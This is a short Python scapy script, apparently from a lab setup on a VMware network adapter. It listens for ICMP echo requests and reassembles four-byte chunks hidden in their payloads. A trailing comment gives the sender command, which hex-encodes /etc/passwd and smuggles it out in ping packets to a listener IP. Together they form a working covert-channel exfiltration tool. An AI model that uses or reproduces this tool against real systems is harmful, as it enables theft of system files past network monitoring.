import sys

try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")
    sys.exit(0)


def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")

sniff(iface="VMware Network Adapter VMnet8", prn=process_packet)

# xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line 192.168.42.128; done